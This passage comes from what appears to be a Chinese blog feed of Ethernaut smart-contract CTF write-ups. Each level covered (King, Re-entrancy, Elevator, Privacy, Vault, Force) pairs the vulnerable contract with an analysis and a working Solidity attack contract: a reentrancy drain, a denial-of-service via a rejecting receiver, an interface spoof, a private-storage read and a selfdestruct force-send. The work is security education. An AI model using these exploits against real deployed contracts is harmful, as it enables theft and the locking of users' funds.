&#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>两次获取题目，attack和attack_都试一次，看看是不是都可以暴力破解。答案：都成功</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224001226714.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/24/image-20221224000933198.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.King</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/09.King/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/09.King/</url>
      
        <content type="html"><![CDATA[<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：</p><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p><p>这么有趣的游戏, 你的目标是攻破他.</p><p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题和之前遇到的这个一模一样，原理见<a href="https://www.levi104.com/2022/12/18/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/11.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">链接</a>。</p><p>在本道题，获取题目实例之后，查看prize是：1000000000000000Wei。</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/09.King/image-20221223131732836.png" alt="image-20221223131732836"></p><p>那么我们就需要至少发送1000000000000001Wei才可以成为新王。关键：用合约发送1000000000000000Wei，并且此合约没有fallback和receive函数</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address(0x24fF7e183ce72d22fD8773Dd751bbcF482B51656).call&#123;value: uint256(1000000000000001)&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>部署合约，获取初始状态</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/09.King/image-20221223131732836.png" alt="image-20221223131732836"></p><p>msg.value设置为1000000000000000Wei，调用attack函数。成功修改_king和prize</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/09.King/image-20221223132308145.png" alt="image-20221223132308145"></p><p>注意：attack的时候需要调高调用gas，否则交易失败</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/09.King/image-20221223132955273.png" alt="image-20221223132955273"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/09.King/image-20221223132331433.png" alt="image-20221223132331433"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.Re-entrancy</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/</url>
      
        <content type="html"><![CDATA[<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：这一关的目标是偷走合约的所有资产</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>重入，老朋友了，具体原理看这里【博客=&gt;09.安全审计=&gt;重入攻击系列】，不做多阐述。</p><p>首先我们查看这个合约有多少钱：0.001ETH，即1000000000000000Wei。</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/image-20221223134115654.png" alt="image-20221223134115654"></p><p>那么按照老套路写代码进行攻击</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    Reentrance public reentrance = Reentrance(0x5435b127B6F9404D2DDd7BE6Ebb61719BF990DFC);</span><br><span class="line"></span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">    //1.设置msg.value=1000000000000000Wei</span><br><span class="line">    //2.这一步将存钱1000000000000000Wei</span><br><span class="line">        reentrance.donate.value(0.001 ether)(address(this));</span><br><span class="line">        //3.然后取钱1000000000000000Wei</span><br><span class="line">        reentrance.withdraw(1000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">    //4.进入fallback重入</span><br><span class="line">        if (address(reentrance).balance &gt;= 0.001 ether) &#123;</span><br><span class="line">        reentrance.withdraw(1000000000000000);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，部署，攻击。记得attack的时候, msg.value设置为1000000000000000Wei</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/image-20221223142424256.png" alt="image-20221223142424256"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/image-20221223141650766.png" alt="image-20221223141650766"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.Elevator</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/11.Elevator/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/11.Elevator/</url>
      
        <content type="html"><![CDATA[<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：将top修改为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>top默认值为false，floor默认值为0。本题需要我们将top修改为true。</p><p>但是这个合约里面没有一个函数可以将top修改成为true。只有一个地方可能，那就是goTo()函数里面的<code>top = building.isLastFloor(floor)</code>。<code>isLastFloor()</code>是接口Building的一个方法，尚未实现，因此我们需要实现这个方法。</p><p>我们分析发现，goTo()代码中，<code>building.isLastFloor(_floor)</code>出现了两次，第一次在if()判断里面，需要我们返回false才可以进入语句。第二次在<code>top = building.isLastFloor(floor)</code>需要我们返回true，才可以修改top为true。因为参数<code>_floor</code>被使用使用了两次，不修改<code>_floor</code>的话结果肯定是一样的(要么都false，要么都true)。因此我们需要在<code>_floor</code>中做文章，使得两次返回的结果，第一次为false，第二次为true。</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack is Building&#123;</span><br><span class="line">    uint floor = 1;</span><br><span class="line">    Elevator elevator = Elevator(0xa9Eb9Ae51b033aE0381d85C30BB4b4e185E09b91);//题目地址</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint _floor) external returns (bool)&#123;</span><br><span class="line">        if(floor == _floor)&#123;</span><br><span class="line">            floor = 2;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        elevator.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释Hack</strong></p><ol><li>攻击合约需要实现Building接口，然后实现<code>isLastFloor</code>方法。</li><li>执行<code>attack()</code>，然后题目Elevator就会执行<code>goTo(1)</code><ol><li><code>Building building = Building(msg.sender)</code>创建了一个接口，接口对象是msg.sender，即Hack合约</li><li><code>! building.isLastFloor(_floor)</code>，这个接口就会回到Hack进行方法<code>isLastFloor(1)</code>的调用。这是第一次调用<code>isLastFloor()</code>，然后floor == _floor吗？在Hack环境中，1==1为true，进入方法体，Hack合约的floor = 2赋值，返回false</li><li>回到Elevator合约，!false进入方法体，Evelator合约环境的floor = _floor，即floor被赋值为1。</li><li>然后<code>top = building.isLastFloor(floor)</code>第二次进入Hack的<code>isLastFloor(1)</code>方法。此时floor == _floor吗？Hack的环境2==1？不进入方法体，返回true。top被赋值为true</li></ol></li></ol><p>需要重点理解的是：Evevator中的接口方法<code>building.isLastFloor(_floor)</code>会返回到Hack中找到对应的实现，然后执行。原因：<code>Building building = Building(msg.sender)</code>，msg.sender是Hack，接口对象是Hack</p><p>我认为这个地方需要注意的是：之所以会出现漏洞，是因为Elevator合约中的<code>Building building = Building(msg.sender)</code>给了外界太多的操作空间，后面的调用都是在外面给定的合约进行操作的，只要接口合约前一次返回flase，后一次返回true，就可以成功修改top为true。所以我们在书写合约的时候，一定要注意和外面的交互时，不要授权给外界太多的权力，外界的合约充满太多的未知</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，部署，初始状态如下：</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/11.Elevator/image-20221223161838015.png" alt="image-20221223161838015"></p><p>发起攻击，然后成功修改：</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/11.Elevator/image-20221223161805780.png" alt="image-20221223161805780"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/11.Elevator/image-20221223161652055.png" alt="image-20221223161652055"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.Privacy</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/12.Privacy/</url>
      
        <content type="html"><![CDATA[<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：将locked修改为false。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题要我们将locked从true修改为false，只有unlock这个方法可以。但是这个方法需要传入一个参数，满足条件才可以修改</p><p>条件<code>_key == bytes16(data[2])</code>：我们需要知道data数组的第三个元素的数据。但是这个数据是private的，所以我们需要用web3js进行查询。查询的插槽情况如下，data[2]数据所在的插槽是slot5。即：<code>0xbe56f5d4c6cf8274060f8a6403d59d36b768f66c00d2d410a3d882be5418eae5</code></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/image-20221223165703012.png" alt="image-20221223165703012"></p><p>同时，因为是bytes16截取，而data数组本身每一个元素是bytes32，因此bytes16会截取前面32位。（从前面开始截取，这是ABI编码的规则）。因此参数应该输入为：<code>0xbe56f5d4c6cf8274060f8a6403d59d36</code></p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，部署，初始状态如下：</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/image-20221223165839717.png" alt="image-20221223165839717"></p><p>输入参数0xbe56f5d4c6cf8274060f8a6403d59d36，调用。成功修改</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/image-20221223165933642.png" alt="image-20221223165933642"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/image-20221223170003195.png" alt="image-20221223170003195"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.Vault</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/08.Vault/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/08.Vault/</url>
      
        <content type="html"><![CDATA[<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：打开 vault 来通过这一关!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题的目的是将locked的值从true改成false，那么方法unlock就可以做到。这个方法需要传入一个参数，这个参数等于password才可以修改locked。那么我们就需要知道password的值。但是password类型为private，不可以直接查看。但是区块链上的数据都是公开透明的，我们可以查。</p><p>我们使用web3js来查找。这里需要我们懂得智能合约上状态变量的存储是以插槽的形式的。那么在这道题，bool类型的变量locked是在<code>slot 0</code>，bytes32类型的变量password是在<code>slot 1</code>。那么我们查找slot 1的数据即是password。</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取密码</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/08.Vault/image-20221223125702843.png" alt="image-20221223125702843"></p><p>部署，攻击</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/08.Vault/image-20221223125327504.png" alt="image-20221223125327504"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/08.Vault/image-20221223125226158.png" alt="image-20221223125226158"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.Force</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/07.Force/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/07.Force/</url>
      
        <content type="html"><![CDATA[<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：向合约发送一些钱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个合约里面什么都没有，没有fallback和receive函数接收以太，也没有任何一个payable的函数可以接收以太。因此我们只可以强制给他打钱。</p><p>我们有一个方法可以强制给一个合约打钱：<code>selfdestruct(addr)</code>。自毁函数在执行的时候会强制给目标地址addr转钱，转出金额为本合约中的所有余额。</p><p>那么我们就可以写一个合约，给合约转点钱，然后让这个合约自毁，自毁的钱转给题目地址</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Force public force;</span><br><span class="line"></span><br><span class="line">    constructor(Force _force) &#123;</span><br><span class="line">        force = Force(_force);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address payable addr = payable(address(force));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>部署，攻击</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/07.Force/image-20221223124406821.png" alt="image-20221223124406821"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/07.Force/image-20221223124432503.png" alt="image-20221223124432503"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.Delegation</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/06.Delegation/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/06.Delegation/</url>
      
        <content type="html"><![CDATA[<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：修改owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public 